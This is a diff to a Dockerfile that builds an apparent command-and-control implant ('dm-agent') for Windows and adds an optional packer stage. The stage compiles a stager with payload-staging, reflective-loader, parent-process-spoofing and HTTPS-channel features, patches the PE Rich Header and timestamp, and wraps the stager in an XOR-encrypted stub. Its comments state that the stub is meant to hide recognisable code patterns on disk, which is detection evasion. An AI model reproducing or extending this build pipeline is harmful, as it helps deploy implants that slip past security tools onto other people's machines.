@@ -1,11 +1,12 @@
 FROM rust:1.86-alpine AS builder
 
-RUN apk add --no-cache mingw-w64-gcc musl-dev
+RUN apk add --no-cache mingw-w64-gcc musl-dev python3
 
 RUN rustup target add x86_64-pc-windows-gnu x86_64-unknown-linux-musl
 
 WORKDIR /build
 COPY agent/ .
+COPY deploy/pe_patch.py /deploy/pe_patch.py
 
 ARG DM_TARGET=x86_64-pc-windows-gnu
 ARG DM_BIN=dm-agent.exe
@@ -25,6 +26,10 @@ ARG DM_SLEEP_ENCRYPT=false
 ARG DM_FEATURES=
 ARG DM_SMB_HOST=
 ARG DM_SMB_PIPE=
+# Set to true to also produce dm-stub.exe (the packer stub).
+# DM_STAGER_FEATURES controls which features are compiled into the embedded stager.
+ARG DM_PACK_STAGER=false
+ARG DM_STAGER_FEATURES=staged-payload,udrl,ppid-spoof,channel-https
 
 ENV DM_TARGET=$DM_TARGET \
     DM_BIN=$DM_BIN \
@@ -55,12 +60,32 @@ RUN --mount=type=cache,id=dm-cargo-registry,target=/root/.cargo/registry \
     --mount=type=cache,id=dm-cargo-git,target=/root/.cargo/git \
     --mount=type=cache,id=dm-cargo-target,target=/build/target,sharing=locked \
     if [ -n "$DM_FEATURES" ]; then \
-        cargo build --release --target $DM_TARGET --features "$DM_FEATURES"; \
+        cargo build --release --bin dm-agent --target $DM_TARGET --features "$DM_FEATURES"; \
     else \
-        cargo build --release --target $DM_TARGET; \
+        cargo build --release --bin dm-agent --target $DM_TARGET; \
     fi && \
     cp /build/target/${DM_TARGET}/release/${DM_BIN} /output/${DM_BIN}
 
+# ── Packer stub (optional, DM_PACK_STAGER=true) ──────────────────────────────
+# Step 1: build the raw stager (minimal feature set — no evasion, just delivery).
+# Step 2: patch Rich Header + timestamp.
+# Step 3: build dm-stub.exe which embeds the encrypted stager via include_bytes!.
+#
+# On disk, dm-stub.exe contains only a small XOR decryptor.  The .text section
+# has no recognisable Rust PE patterns — the real code is an encrypted blob.
+RUN --mount=type=cache,id=dm-cargo-registry,target=/root/.cargo/registry \
+    --mount=type=cache,id=dm-cargo-git,target=/root/.cargo/git \
+    --mount=type=cache,id=dm-cargo-target,target=/build/target,sharing=locked \
+    if [ "$DM_PACK_STAGER" = "true" ]; then \
+        cargo build --release --bin dm-agent --target $DM_TARGET \
+            --features "${DM_STAGER_FEATURES}" && \
+        STAGER=/build/target/${DM_TARGET}/release/dm-agent.exe && \
+        python3 /deploy/pe_patch.py "$STAGER" --inplace && \
+        DM_STAGER_PATH="$STAGER" \
+        cargo build --release --bin dm-stub --target $DM_TARGET \
+            --no-default-features --features "packer-stub" && \
+        cp /build/target/${DM_TARGET}/release/dm-stub.exe /output/dm-stub.exe; \
+    fi
+
 FROM alpine:3.20
-ARG DM_BIN=dm-agent.exe
-COPY --from=builder /output/${DM_BIN} /${DM_BIN}
+COPY --from=builder /output/ /output/
